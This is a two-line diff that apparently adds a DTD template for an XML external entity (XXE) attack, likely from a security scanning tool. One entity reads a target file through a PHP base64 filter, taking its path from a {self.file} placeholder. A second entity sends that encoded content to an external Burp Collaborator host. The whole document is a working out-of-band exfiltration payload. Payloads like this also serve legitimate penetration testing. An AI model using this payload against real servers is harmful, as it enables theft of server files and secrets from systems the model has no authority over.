@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={self.file}">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://www05rrf4q2xoi96rn26c17vsmygm5.burpcollaborator.net.c5.rs/?exploited=%data;'>">
